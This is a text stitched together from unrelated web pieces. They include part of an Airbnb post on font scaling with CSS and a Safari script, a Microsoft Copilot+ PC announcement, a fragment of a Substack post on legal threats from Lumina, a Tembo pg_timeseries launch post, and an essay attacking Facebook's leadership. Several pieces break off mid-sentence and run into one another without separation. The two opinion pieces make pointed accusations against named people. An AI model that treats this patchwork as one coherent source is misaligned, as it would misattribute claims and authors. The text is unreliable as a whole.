options);<br>};</span></pre><p id="98f3">Then the convertToRem will look through the keys and values and map a converted value for any of the font sizing attributes. This allowed us to automate the conversion process in a more straightforward way.</p><h2 id="6519">Improvements for Testing Components</h2><p id="7f48">With these two challenges out of the way, we can start testing our components to verify if there are any major issues we might need to resolve before rolling out. In our component documentation and tooling, we built an internal plugin to allow for easier testing by setting the font-size on the html element directly to test with font scaling.</p><p id="965a">Screenshot testing has helped our teams catch visual regressions. Adding support to allow for setting additional screenshots at different root font sizes has helped our product teams review what the component looks like at different font scales. To do this, we allow for adding additional font sizes to be set when capturing the screenshots so you don’t have to create new component variations just for font scaling.</p><h2 id="0d96">Font Scaling on Mobile Safari</h2><p id="9b30">Supporting font scaling for Mobile Safari was more difficult. Unlike other browsers, there is not a font size preference available in Mobile Safari. However, they have released support for their own font: -apple-system-body but there are some important considerations.</p><p id="6596">Since macOS High Sierra (10.13), desktop Safari also supports the font preference, but there is not an easy “font size” configuration available in MacOS. Because there can be unexpected behavior on desktop Safari, so we used a @supports statement to prevent this. The code below will only target Mobile Safari.</p><pre><span id="a035">// Apple's Dynamic Type requires this font family to be used<br>// Only target iOS/iPadOS<br>@supports (font: -apple-system-body) and (-webkit-touch-callout: default) {<br>  :root {<br>    font: -apple-system-body;<br>  }<br>}</span></pre><p id="3a02">Another consideration is that the “100%” default font size selected does not equal the standard font size of 16px, but rather 17px. This is a very subtle difference, but it is critical for the design quality bar we aim to achieve at Airbnb. So to resolve this issue, we ended up using an inline head script to normalize the value, by placing it early into the page execution we avoided seeing a change in font size.</p><pre><span id="6531">(() =&gt; {<br>  // don't do anything if the browser doesn't match the supports statement<br>  if (!CSS.supports('(font: -apple-system-body) and (-webkit-touch-callout: default)')) return;<br>  // Must create an element since the root element styles are not yet parsed.<br>  const div = document.createElement('div');<br>  div.setAttribute('style', 'font: -apple-system-body');<br>  // Body is not available yet so this has to be added to the root element<br>  documentElement.appendChild(div);<br>  const style = getComputedStyle(div);<br>  if (style.fontSize === '17px') {<br>    documentElement.style.setProperty('font-size', '16px');<br>  }<br>  documentElement.removeChild(div);<br>})();</span></pre><p id="e4b7">Then when the page loads we use a resize observer to detect if the value changes again to unset or set the font-size property on the html element. This helps us still support scalable fonts, but not have a significant impact on the default font size (100%).</p><h2 id="8cee">Impact</h2><p id="d1f5">Supporting scalable fonts is an investment that should make a dramatic difference for our Hosts and guests with low vision and anyone who benefits from larger font sizes and control over their browsing experience. Below are two examples of the home page showing how the default font size (16px) appears to someone who has blurry vision and what it looks like by doubling the font size (32px). The second image is far more legible and usable.</p></div><div><p id="43f5">Choosing font scaling as the product accessibility strategy brought about a range of significant benefits that notably enhanced our platform’s overall user experience. Making that change using automation to convert to rem units made this transition easier. When looking at our overall issues count after these changes were site wide, more than 80% of our existing Resize Text issues were resolved. Moreover, we are seeing fewer new issues since then.</p><p id="1262">To conclude, our journey to enhance Resize Text on the web has been filled with valuable, practical lessons. From how we strategically apply rem units, to the role of tooling and automation, each lesson has been a vital step forward in elevating our user experience on Airbnb. We hope that by sharing our journey, we can help others navigate this transition more seamlessly. Our work is ongoing, and we are committed to continuously advancing Airbnb’s accessibility.

<p><span data-contrast="auto">This first wave of Copilot+ PCs is just the beginning. Over the past year, we have seen an incredible pace of innovation of AI in the cloud with Copilot allowing us to do things that we never dreamed possible. Now, we begin a new chapter with AI innovation on the device. We have completely reimagined the entirety of the PC – from silicon to the operating system, the application layer to the cloud </span><span data-contrast="auto">–</span><span data-contrast="auto"> with AI at the center, marking the most significant change to the Window platform in decades.&nbsp;</span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></p>

<h3><b><span data-contrast="auto">The fastest, most secure Windows PCs ever built</span></b><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></h3>
<p>We introduced an all-new system architecture to bring the power of the CPU, GPU, and now a new high performance Neural Processing Unit (NPU) together. Connected to and enhanced by the large language models (LLMs) running in our Azure Cloud in concert with small language models (SLMs), Copilot+ PCs can now achieve a level of performance never seen before. They are up to 20x more powerful<a href="#_ftn1" name="_ftnref1">[1]</a> and up to 100x as efficient<a href="#_ftn2" name="_ftnref2">[2]</a> for running AI workloads and deliver industry-leading AI acceleration. They outperform Apple’s MacBook Air 15” by up to 58% in sustained multithreaded performance<a href="#_ftn3" name="_ftnref3">[3]</a>, all while delivering all-day battery life.&nbsp; With incredible efficiency, Copilot+ PCs can deliver up to 22 hours of local video playback or 15 hours of web browsing on a single charge.<a href="#_ftn4" name="_ftnref4">[4]</a> That is up to 20% more battery in local video playback than the MacBook Air 15”.<a href="#_ftn5" name="_ftnref5">[5]</a></p>
<p>Windows now has the best implementation of apps on the fastest chip, starting with Qualcomm. We now offer more native Arm64 experiences than ever before, including our fastest implementation of Microsoft 365 apps like Teams, PowerPoint, Outlook, Word, Excel, OneDrive and OneNote. Chrome, Spotify, Zoom, WhatsApp, Blender, Affinity Suite, DaVinci Resolve and many more now run​ natively on Arm to give you great performance with additional apps, like Slack, releasing later this year. In fact, 87% of the total app minutes people spend in apps today have native Arm versions.<a href="#_ftn1" name="_ftnref1">[6]</a> With a powerful new emulator, Prism, your apps run great, whether native or emulated.</p>
<p>Every Copilot+ PC comes secured out of the box. The Microsoft Pluton Security processor will be enabled by default on all Copilot+ PCs and we have introduced a number of new features, updates and defaults to Windows 11 that make it easy for users to stay secure. And, we’ve built in personalized privacy controls to help you protect what’s important to you. You can read more about how we are making Windows more secure <a href="https://www.microsoft.com/en-us/security/blog/?p=134243">here</a>.</p>
<h3><b><span data-contrast="auto">Entirely new, powerful AI experiences&nbsp;</span></b><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></h3>
<p><span data-contrast="auto">Copilot+ PCs leverage powerful processors and multiple state-of-the-art AI models, including several of Microsoft’s world-class SLMs, to unlock a new set of experiences you can run locally, directly on the device. This removes previous limitations on things like latency, cost and even privacy to help you be more productive, creative and communicate more effectively.</span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></p>
<h3><b><span data-contrast="auto">Recall instantly</span></b><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></h3>
<p><span data-contrast="auto">We set out to solve one of the most frustrating problems we encounter daily – finding something we know we have seen before on our PC. Today, we must remember what file folder it was stored in, what website it was on, or scroll through hundreds of emails trying to find it.&nbsp;</span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></p>
<p>Now with Recall, you can access virtually what you have seen or done on your PC in a way that feels like having photographic memory. Copilot+ PCs organize information like we do – based on relationships and associations unique to each of our individual experiences. This helps you remember things you may have forgotten so you can find what you’re looking for quickly and intuitively by simply using the cues you remember. <a href="#_ftn1" name="_ftnref1">[7]</a></p>
<p>You can scroll across time to find the content you need in your timeline across any application, website, document, or more. Interact intuitively using snapshots with screenray to help you take the next step using suggested actions based on object recognition. And get back to where you were, whether to a specific email in Outlook or the right chat in Teams.</p>
<p>Recall leverages your personal semantic index, built and stored entirely on your device. Your snapshots are yours; they stay locally on your PC. You can delete individual snapshots, adjust and delete ranges of time in Settings, or pause at any point right from the icon in the System Tray on your Taskbar. You can also filter apps and websites from ever being saved. You are always in control with privacy you can trust.</p>

<p><strong>Cocreate with AI-powered image creation and editing, built into Windows</strong></p>
<p>Since the launch of Image Creator, almost 10 billion images have been generated, helping more people bring their ideas to life easily by using natural language to describe what they want to create. Yet, today’s cloud offerings may limit the number of images you can create, keep you waiting while the artwork processes or even present privacy concerns. By using the Neural Processing Units (NPUs) and powerful local small language models, we are bringing innovative new experiences to your favorite creative applications like Paint and Photos.</p>
<p>Combine your ink strokes with text prompts to generate new images in nearly real time with Cocreator. As you iterate, so does the artwork, helping you more easily refine, edit and evolve your ideas. Powerful diffusion-based algorithms optimize for the highest quality output over minimum steps to make it feel like you are creating alongside AI. Use the creativity slider to choose from a range of artwork from more literal to more expressive. Once you select your artwork, you can continue iterating on top of it, helping you express your ideas, regardless of your creative skills.</p>

To explain, here’s a timeline of my last 72 hours.</span></p><p>1. I get an email Friday night from Aaron Silverbook, founder of Lumina, that says only “Hey Trevor; want to do a call?”. He follows up on Saturday afternoon.</p><p><span>2. I get an email Sunday afternoon (yesterday) with explanations of Lumina’s manufacturing, along with a legal threat. Email is reprinted verbatim below</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-1-144809924" href="https://trevorklee.substack.com/p/luminas-legal-threats-and-my-about#footnote-1-144809924" target="_self" rel="">1</a></span><span>.</span></p><p><span>3. I agree to temporarily take the post down, </span><a href="https://trevorklee.substack.com/p/updates-on-lumina-probiotic" rel="">post an update to my readers</a><span>, and ask for a meeting to ask scientific questions. Aaron refuses my request to record the meeting, so I take notes instead and email them to him afterwards. As my last post indicates, Aaron mostly deferred scientific questions to his advisor, Justin Merritt, and his employee, Rob Williams. I send emails to both of them.</span></p><p><span>4. In the few hours after publishing my updates on Lumina, I get 4 comments on my post, one supportive, three negative. The supportive one is from Will Manidis, who’s been reading my blog for a while. One critical comment is from Aaron, and contains multiple factual inaccuracies, which I address below</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-2-144809924" href="https://trevorklee.substack.com/p/luminas-legal-threats-and-my-about#footnote-2-144809924" target="_self" rel="">2</a></span><span>. Note that I was unable to refute them directly because he directly references the post that he requested I take down.</span></p><p>The other two critical comments are from people who I’ve never heard from before. On further research, one of them is from someone who subscribed to my Substack directly before commenting. They follow Lumina on Twitter. The other is from someone who doesn’t subscribe to my Substack, which is suspicious, because I didn’t share this post anywhere except to my subscribers.</p><p><span>5. Rob Williams writes me a long response to my email in which he dodges my main questions. I ask follow-up questions to get clarifications. He asks me “how I’d like to be served” and threatens me with “spending years in and out of a California courtroom” (full email printed below)</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-3-144809924" href="https://trevorklee.substack.com/p/luminas-legal-threats-and-my-about#footnote-3-144809924" target="_self" rel="">3</a></span><span>.</span></p><p>6.

But yeah, I mostly just wanted this as the header image.</figcaption></figure></div><p>I had my suspicions that Aaron did not want to engage in legitimate scientific debate, given that he did not respond to my email. I was willing to give him the benefit of the doubt, though, even when he threatened legal action, refused to be recorded or in writing giving any responses, and deferred all scientific questions to his advisors.</p><p>However, given that he’s now said deliberately inaccurate things on my blog, I believe engaged his supporters to brigade my blog, and connected me with an employee who also threatened to sue me, I will no longer give him or Lumina the benefit of the doubt. I think Aaron and Lumina would rather their product claims be not submitted to scrutiny by anyone, and are willing to intimidate and lie in order to do so.</p><p>I believe (note the libel-friendly phrasing) that:</p><p>1. Lumina’s manufacturing process follows legally mandated GMP protocols, if not the probiotic trade association’s voluntary best practices.</p><p>2. It is weird to be secretive about your manufacturing until pressed on it, especially when you have made a point of trying to evade regulations. See Zbiotics for a great example of how to behave responsibly and communicate openly when selling genetically modified bacteria for human health issues. It’s especially weird to threaten lawsuits when people ask follow-up questions about your manufacturing.</p><p>3. Lumina’s product is a drug, not a cosmetic product.&nbsp; And, regardless of whether it is a cosmetic product, it has the potential to cause great harm. This means it needs extensive human safety testing. This can be under the FDA or not.</p><p>4. There are scientific reasons to believe that Lumina’s product can be unsafe and ineffective in humans, based on the reasoning in my previous posts.

            <description><![CDATA[<p>URL: <a href="https://tembo.io/blog/pg-timeseries">https://tembo.io/blog/pg-timeseries</a>, See on <a href="https://news.ycombinator.com/item?id=40417347">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>  <p>We are excited to launch <code>pg_timeseries</code>: a PostgreSQL extension focused on creating a cohesive user experience around the creation, maintenance, and use of time-series tables. You can now use pg_timeseries to create time-series tables, configure the compression and retention of older data, monitor time-series partitions, and run complex time-series analytics functions with a user-friendly syntax. pg_timeseries is <a href="https://github.com/tembo-io/pg_timeseries">open-sourced</a> under the PostgreSQL license and can be added to your existing PostgreSQL installation or tried as a part of the <a href="https://tembo.io/docs/product/stacks/analytical/timeseries">Timeseries Stack</a> on <a href="https://cloud.tembo.io/">Tembo Cloud</a>.</p>
<h2 id="what-is-time-series-data">What is time-series data?</h2>
<p>Put simply, time-series data is a collection of data points, each with a timestamp attached. These could be stock prices recorded throughout a trading day, temperature and availability data returned from devices and sensors, or web traffic on a website. Time-series workloads typically include queries filtering by time (generally for some degree of recency) and aggregation queries to summarize the data for analytics.</p>
<p><img src="https://tembo.io/_astro/ts-wiki.6MOvJoCu_ZGpQ8A.webp" alt="time-series" title="time-series" width="601" height="447" loading="lazy" decoding="async"></p>
<h2 id="using-postgresql-for-time-series-workloads">Using PostgreSQL for Time-series workloads</h2>
<p>We believe that PostgreSQL can be used to <a href="https://tembo.io/blog/tembo-manifesto">power any data workload</a> thanks to its extensions and ecosystem tools. Therefore, at Tembo, we aim to make it easy for users to <a href="https://tembo.io/blog/ga">use the entire PostgreSQL ecosystem</a> to reduce the complexity of the modern data stack.</p>
<p>In the last year, we’ve built several <a href="https://tembo.io/docs/product/stacks/intro-to-stacks">stacks</a> and extensions that help you run <a href="https://tembo.io/docs/product/stacks/analytical/data-warehouse">analytics</a>, <a href="https://tembo.io/docs/product/stacks/ai/vectordb">AI</a>, and <a href="https://tembo.io/docs/product/stacks/transactional/oltp">operational</a> workloads on PostgreSQL. However, our customers’ most requested stack has been one able to store and act upon their time-series data. That way, they can store all of their data with a single PostgreSQL provider who can meet all their needs.</p>
<p>You may already be asking: “why not just power the stack using <a href="https://github.com/timescale/timescaledb">TimescaleDB</a>?” The Timescale License would restrict our use of features such as compression, incremental materialized views, and bottomless storage. With these missing, we felt that what remained would not provide an adequate basis for our customers’ time-series needs. Therefore, we decided to build our own PostgreSQL-licensed extension.</p>
<h2 id="building-blocks-for-pg_timeseries">Building blocks for pg_timeseries</h2>
<p>To efficiently store and query time-series data, there are a few requirements:</p>
<ul>
<li>Easily manage time-series data</li>
<li>Deal with high-throughput ingest</li>
<li>Answer range queries fast</li>
<li>Efficiently store large amounts of data</li>
<li>Run complex analytics functions</li>
</ul>
<p>PostgreSQL has several features that provide the right building blocks to solve these requirements. Features such as <a href="https://www.postgresql.org/docs/current/ddl-partitioning.html">native partitioning</a>, variety of <a href="https://www.postgresql.org/docs/current/indexes.html">indexes</a>, <a href="https://www.postgresql.org/docs/current/rules-materializedviews.html">materialized views</a>, and <a href="https://www.postgresql.org/docs/current/tutorial-window.html">window / analytics functions</a> provide the main functionality. Several extensions add additional features to PostgreSQL to make it even better: <a href="https://github.com/pgpartman/pg_partman">pg_partman</a> for partition management, <a href="https://github.com/citusdata/pg_cron">pg_cron</a> for scheduling jobs, <a href="https://github.com/hydradatabase/hydra/tree/main/columnar">columnar</a> for compression, <a href="https://github.com/sraoss/pg_ivm">pg_ivm</a> for incremental materialized views, and <a href="https://github.com/tembo-io/pg_tier">pg_tier</a> for long-term offloading of older partitions.</p>
<p>Making all of these components work together cohesively is a tall order, and is hard for most users. pg_timeseries aims to solve this problem.</p>
<h2 id="pg_timeseries-the-simplest-way-to-manage-your-time-series-data-in-postgresql">pg_timeseries: The simplest way to manage your time-series data in PostgreSQL</h2>
<p>pg_timeseries combines the functionality of extensions such as pg_partman, pg_cron, and Hydra’s columnar in order to provide a unified and intuitive interface for managing and querying time-series tables. The PostgreSQL ecosystem has contained many approaches to various aspects of time-series workloads for years and pg_timeseries does the work of making sure all PostgreSQL users experience how these tools work together to make time-series workloads a cinch.</p>
<p>All pg_timeseries requires to get started is a table with a time-like column, partitioned on that column. After that, simply call <a href="https://github.com/tembo-io/pg_timeseries/blob/main/doc/reference.md#enable_ts_table">enable_ts_table</a>:</p>
<pre tabindex="0"><code><span><span>    CREATE TABLE measurements (</span></span>
<span><span>      metric_name text,</span></span>
<span><span>      metric_value numeric,</span></span>
<span><span>      metric_time timestamptz NOT NULL</span></span>
<span><span>    ) PARTITION BY RANGE (metric_time);</span></span>
<span><span></span></span>
<span><span>    SELECT enable_ts_table('measurements');</span></span></code></pre>
<p>The extension includes various views such as <a href="https://github.com/tembo-io/pg_timeseries/blob/main/doc/reference.md#ts_table_info">ts_table_info</a> and <a href="https://github.com/tembo-io/pg_timeseries/blob/main/doc/reference.md#ts_part_info">ts_part_info</a> to surface important information about your tables and partitions:</p>
<pre tabindex="0"><code><span><span>    SELECT table_id, table_size_bytes FROM ts_table_info;</span></span>
<span><span></span></span>

<span><span>    └──────────────────┴───────────────────────────────┘</span></span></code></pre>
<p>As partitions “age out” of your time-series tables, you can choose whether to have them compressed using columnar storage, deleted entirely, or both. For example, the following will cause partitions to be compressed if their data is older than 90 days, and will drop them entirely after one year:</p>
<pre tabindex="0"><code><span><span>    SELECT set_ts_compression_policy('measurements', '90 days');</span></span>
<span><span>    SELECT set_ts_retention_policy('measurements', '365 days');</span></span></code></pre>
<p>Finally, pg_timeseries includes additional functions like <a href="https://github.com/tembo-io/pg_timeseries/blob/main/doc/reference.md#locf">locf</a>, <a href="https://github.com/tembo-io/pg_timeseries/blob/main/doc/reference.md#firstlast">last</a> and <a href="https://github.com/tembo-io/pg_timeseries/blob/main/doc/reference.md#date_bin_table">date_bin_table</a> to make writing time-series queries easier. We know SQL can sometimes be hard to wrangle into doing what you want with time-series data, so these functions were written to enhance query maintainability. For instance, the following will bin data in the specified range by hour and fill any missing hours with the previous reading. It also includes the name of the metric in each hour with the highest reading:</p>
<pre tabindex="0"><code><span><span>    SELECT</span></span>
<span><span>      locf(avg(metric_value)) OVER (ORDER BY metric_time) avg_val,</span></span>
<span><span>      last(metric_name, metric_value) highest,</span></span>
<span><span>      metric_time</span></span>
<span><span>    FROM date_bin_table(NULL::measurements, '1 hour', '[2024-05-09,2024-06-07]')</span></span>
<span><span></span></span>
<span><span>    ┌──────────┬─────────┬────────────────────────┐</span></span>
<span><span>    │  avg_val │ highest │      metric_time       │</span></span>

<h2 id="were-just-getting-started">We’re just getting started</h2>
<p>We know building a full-featured time-series extension for PostgreSQL requires a lot of pieces. However, we’re committed to building them in the open, with the community. The current roadmap includes the following features:</p>
<ul>
<li>Offloading older partitions to cold storage such as S3</li>
<li>Approximate functions for efficient analytics</li>
<li>Incremental materialized views</li>
<li>Roll-up and roll-off of older partitions</li>
<li>Additional analytics helper functions</li>
</ul>
<p>The entire planned roadmap is present on the <a href="https://github.com/tembo-io/pg_timeseries/tree/main?tab=readme-ov-file#roadmap">GitHub README</a> and features will be prioritized based on demand from users. Our next addition is going to be plugging in <a href="https://github.com/tembo-io/pg_tier">pg_tier</a> with pg_timeseries to allow offloading older tables to cold storage such as S3.</p>
<p>The simplest way to try out pg_timeseries is spinning up a free instance of the Timeseries stack on Tembo Cloud. We look forward to your feedback!</p>  </div></div>]]></description>

<div id="readability-page-1" class="page"><article>
      <p>Over the last decade, few platforms have declined quite as rapidly and visibly as Facebook and Instagram. What used to be apps for catching up with your friends and family are now algorithmic nightmares that constantly interrupt you with suggested content and advertisements that consistently outweigh the content of people that you choose to follow.&nbsp;</p><p>Conversely, those running Facebook groups routinely find that their content <em>isn’t even being shown</em> to those who choose to follow them thanks to Meta’s outright abusive approach to social media where the customer is not only <em>wrong</em>, but should ideally have little control over what they see.</p><p>Over the next two newsletters, I’m going to walk you through the decline of Facebook and Instagram, starting with the events that led to its decay and those I believe are responsible for turning the world’s most popular consumer apps into skinner boxes for advertising agencies.</p><p>In the case of Facebook, the decline is either reflected in — or directly facilitated by — two specific features: People You May Know and the News Feed. It’s my belief that these products, piloted by deeply insidious people led by Mark Zuckerberg himself, are central to the darkness inside this company.</p><p>And I want to dispel a notion that many people have: Facebook has, from the very beginning, been a rotten, manipulative company, one that acted with little regard for users, even at times when it pretended to do so. The goal has always been more — not just more <em>money</em>, but more engagement, more time on the app, more visits to the website, and perpetual growth, all mandated by Mark Zuckerberg and a rogue’s gallery of rot economists.</p><p>We start our story in 2004, a few months after the company was founded, when Peter Thiel became Facebook’s first investor, putting $500,000 into the company in return for a 10.2% stake. As depicted in the 2010 Aaron Sorkin film The Social Network, Thiel was introduced to Zuckerberg by Sean Parker, the co-founder of Napster, his wounds fresh from a brutal beating by Lars Ulrich and Metallica.&nbsp;</p><p>What was significant about this event wasn’t the people involved or the amount of money invested, but the terms of the deal — terms that would permanently and inextricably ruin Facebook. Parker, ever the advocate for founders, negotiated with Peter Thiel to allow Mark Zuckerberg to retain two of Facebook’s five board seats. <a href="https://www.nytimes.com/2012/02/03/technology/from-earliest-days-zuckerberg-focused-on-controlling-facebook.html?smid=nytcore-ios-share&amp;referringSource=articleShare&amp;sgrp=c-cb&amp;ref=wheresyoured.at"><u>When Parker resigned in 2005, he insisted that Zuckerberg be given his seat</u></a>.&nbsp;</p><p>While this may have seemed a noble, even ideal situation for a founder in these early days, this single move has allowed Zuckerberg to wield complete power over Facebook, and was the first step along a road that has made him impossible to fire, ultimately dooming the company to whatever miserable death march Harvard’s most quirked-up white boy would deem fit.</p><blockquote>As an aside: Zuckerberg’s invulnerability also comes from Meta’s dual-class share structure. Essentially, there are two kinds of Meta stock: Class A shares, which are widely traded and represent one vote, and Class B shares, which each represent ten votes.&nbsp;<p>Zuckerberg </p><a href="https://www.vox.com/technology/2018/11/19/18099011/mark-zuckerberg-facebook-stock-nyt-wsj?ref=wheresyoured.at"><u>owns an estimated 60% of all Class B shares</u></a>, with a significant chunk of the remainder largely held by insiders and other sycophants. This means that despite only owning roughly 13% of Facebook shares, his power is virtually absolute. While there are relatively fewer Class B shares than Class A shares, it doesn’t really matter, given the disproportionate power they wield. In essence, this makes Zuckerberg invulnerable to a stockholder revolt, or the arrival of an activist investor (like, for example, Bill Ackman).&nbsp;<p>This isn’t a particularly unusual structure. It’s common within technology companies, particularly those founded over the past few decades. Google has a three-tier stock structure, with Class B shares (those with the most voting power) held by Larry Page, Sergey Brin, and former CEO Eric Schmidt, in essence giving them a majority despite collectively only owning a relatively small percentage of the company. Class C shares, which </p><a href="https://www.nasdaq.com/articles/facebook-fb-decides-against-the-creation-of-class-c-shares-2017-09-25?ref=wheresyoured.at#:~:text=Last%20year%2C%20during%20its%20first,A%20and%20Class%20B%20shares."><u>Facebook has tried (and failed) to issue</u></a>, carry no voting rights. </blockquote><p>I cannot express how important this moment was. This was when the mistake was made, albeit innocently, that kept Zuckerberg in power. I would be kind and suggest that Sean Parker didn’t know what Mark Zuckerberg was like at this point other than the fact that he absolutely did, and he should have known better.&nbsp;</p><p>A few years later in April 2006, <a href="https://www.linkedin.com/pulse/how-did-mark-zuckerberg-retain-26-equity-facebook-after-sramana-mitra/?ref=wheresyoured.at"><u>Zuckerberg</u></a> was once again able to negotiate terms that kept him at the top, in part thanks to Facebook’s strong revenue — $6 million a year, an impressive sum at the time, especially for company in the new and ill-defined social networking space — and the fact that he owned three out of five board seats and could do whatever the hell he wanted. Venture capitalists desperate to avoid missing out on a company with rocketship growth had little leverage against a man with the keys to the most important company in tech.&nbsp;</p><p><a href="https://techcrunch.com/2006/09/05/new-facebook-redesign-more-than-just-aesthetics/?ref=wheresyoured.at"><u>In September 2006</u></a>, Facebook would launch the News Feed — a relatively unsophisticated chronological feed of your friends’ status that is, on some level, one of the most important launches in modern software history, and a great example of a good product that got destroyed by executives that realized a focal point for their users is a great place to torture them with advertising.&nbsp;</p><p>Don’t get me wrong. It had a rough start. The feed, which Facebook product manager Ruchi Sanghvi described as “quite unlike anything you can find on the web,” led to an immediate revolt within Facebook’s 9.5 million users, as it effectively showed a stream of <em>literally every action you took on the platform,</em> which users found “creepy” and “stalker-esque” according to a group made at the time called Students Against Facebook News Feed.&nbsp;</p><p>For those who weren’t around when it launched, or didn’t use Facebook, this bit is hard to grasp. It would show you literally every activity you and your friends did. If you joined or left a group, or made a new connection, it would appear for all to see. It was almost like a panopticon — one where you are simultaneously the jailer and the prisoner.&nbsp;</p><p>A few days later, Zuckerberg would apologize, saying that Facebook “<a href="https://www.cnet.com/culture/facebooks-zuckerberg-we-really-messed-this-one-up/?ref=wheresyoured.at"><u>really messed this one up</u></a>,” and that Facebook spent two days coding non-stop to add a privacy page that allowed users to choose which types of stories went into their News Feed. While this feature was actually released, it’s important to know that while the rest of the world might not have known what you were doing afterwards, Mark Zuckerberg and Facebook absolutely did.</p><p>This was the same year that Facebook opened to the general public, turned down a billion-dollar acquisition offer from Yahoo, and signed a three-year advertising deal with Microsoft.&nbsp;</p><p>Yet Facebook’s rot began in earnest in 2008, when a former McKinsey analyst, now the Vice President of Global Online Sales &amp; Operations at Google, would be made Chief Operating Officer of Facebook. Her name was Sheryl Sandberg, and she would be the force that would grow Facebook into a truly evil company.</p><hr><p><a href="https://marker.medium.com/the-untold-history-of-facebooks-most-controversial-growth-tool-2ea3bfeaaa66?ref=wheresyoured.at"><u>According to an excerpt from Steven Levy’s “Facebook: The Inside Story,”</u></a> sometime in 2008, Facebook’s growth had stalled somewhere around 90 million users, with Zuckerberg telling Levy in an interview that the company had “hit a wall.”&nbsp;</p><p>Chamath Palihapitiya, a former venture capitalist who was at the time Facebook’s VP of Platform &amp; Monetization, came to Zuckerberg with an idea — that Facebook should focus on a new metric, monthly active users. This metric, which is now a cornerstone of most tech companies’ growth metrics, would be a measure of whether users were sticking on the platform, and boosting this number would mean that users were engaged with the product.&nbsp;</p><p>In a meeting with Zuckerberg and Sandberg, Palihapitiya was asked to name it, and it came up with MAUs. Sandberg responded that they should “just call it growth.”&nbsp;</p><p>At the next board meeting, Palihapitiya would present what Levy would call “aggressive growth techniques” that would double or triple Facebook’s user base, and then “use the platform itself as an engine for growth.”&nbsp;</p><p>After a tepid response at the meeting, Palihapitiya was given license to build a new growth team from both within and outside Facebook, one that would eventually become a rogue’s gallery of rot economists, including Facebook Head of Product Naomi Gleit, and Alex Schultz, who would go on to become Meta’s Chief marketing Officer and VP of Analytics, along with fellow teammate Javier Olivan, who replaced Sandberg as Chief Operating Officer in 2022.</p><p>Gleit, Olivan and Schultz are at the epicenter of almost every single choice that Meta has made to put growth above the user experience. Palihapitiya wanted their team — which also included early Facebook data scientist Danny Ferrante and Blake Ross, who previously co-created the Firefox Web Browser — to become “the Growth Circle,” what Levy refers to as “a power center in the company with special status and a distinctive subculture.”&nbsp;</p><p>He succeeded. In 2008, Facebook would launch a feature called “People You May Know,” a seemingly-innocent feature that would, as the name suggests, suggest people that you might know on Facebook. Yet this innocent seemed to be a little too good at its job, with reporter Kashmir Hill — <a href="https://gizmodo.com/people-you-may-know-a-controversial-facebook-features-1827981959?ref=wheresyoured.at"><u>who spent over a year investigating the feature for Gizmodo</u></a> from 2016 to 2017 —&nbsp; saying it “mined information users don’t have control over to make connections they may not want to make,” such as suggesting patients friend their psychiatrist, or outing a sex worker’s real identity to her clients.</p><p>Despite doggedly researching People You May Know, Hill never got Facebook to explain how it worked. Nevertheless, Steven Levy was able to get Palihapitiya to reveal one horrifying detail — that Facebook’s growth team would take out google ads on people’s names, targeting those who hadn’t joined Facebook with “dark profiles,” fake links that would suggest that somebody had already taken their name.&nbsp;</p><p>While many might consider People You May Know a well-meaning feature, the algorithm behind the service is extremely powerful and sinister, capable of dragging up distant relationships, honed by both the data you knowingly give Facebook (the connections you’ve made, for example), and other unknown sources.</p><p>I do, however, believe there’s another person responsible — a man named Lars Backstrom, a relatively-unknown yet powerful figure in Facebook’s history.&nbsp;</p><p>Backstrom’s LinkedIn notes that he “built PYMK (People You May Know)’s backend infrastructure and machine learning system” starting from September 2009 through February 2012. In 2013, Backstrom published a paper in tandem with computer scientist Jon Kleinberg called “Romantic Partnerships and the Dispersion of Social Ties: A Network Analysis of Relationship Status on Facebook.” <a href="https://archive.nytimes.com/bits.blogs.nytimes.com/2013/10/28/spotting-romantic-relationships-on-facebook/?_r=1&amp;ref=wheresyoured.at"><u>The paper</u></a> focuses on an algorithm that was able to independently identify someone’s spouse, according to the Times’ Steven Lohr, 60 percent of the time, and even able to calculate when a couple might break up.&nbsp;</p><p>The paper hinged on the idea that mutual friends isn’t an indicator of a couple’s relationship status, but rather the “dispersion” of those mutual friends — the amount of mutual friends <em>that are also mutual friends with each other.</em> This is a seemingly sensible idea that, when framed as an algorithm made by the engineer who made Facebook’s extremely successful growth tool, feels far more creepy.</p><p>Backstrom, in a 2010 talk relayed by Steven Levy, said that People You May Know “accounted for a significant chunk of all friending on Facebook,” and that friends-of-friends are the most powerful part of the tool. People You May Know’s power wasn’t just that it found people that you knew well, but people you sort-of knew, offering you the tantalizing idea of getting close to them, and when you friended them, Facebook’s News Feed would make their content more prevalent in your feed, forcing an intimacy that may not have existed by making a new connection — no matter how tangential it may be — feel more immediate in your life.&nbsp;</p><p>This subtle feature is responsible for much of Facebook’s growth, and was deliberately engineered by rot economists like Schultz, Gleit and Olivan to do so at any cost, even if it endangered the lives of children.&nbsp;</p><p><a href="https://wsj.com/tech/encryption-instagram-facebook-messages-a89ebe07?mod=hp_lead_pos2&amp;ref=wheresyoured.at"><u>According to the Wall Street Journal</u></a>, in 2018 an engineer in charge of one of Facebook’s community integrity teams, David Erb, found that “the most frequent way adults found children to prey upon” was People You May Know. The Journal also reported that a few days later, Erb found that Meta was planning to add encryption to Facebook messages, something that would prevent the company from fixing the problem, threatening to resign in protest. He was placed on leave not long after, eventually leaving.&nbsp;</p><p>Facebook introduced encryption to its messages, despite Erb’s stark warning that millions of pedophiles were targeting tens of millions of children.<em> </em>People You May Know was — and is — a dangerous tool, created, maintained and proliferated by people that now effectively run Meta.&nbsp;</p><p>Once Palihapitiya left Facebook in 2011 to start a venture capital firm, his team — Schultz, Gleit, and Olivan — continued to accumulate power. I believe these people, along with Lars Backstrom, are responsible for making People You May Know into a reckless, 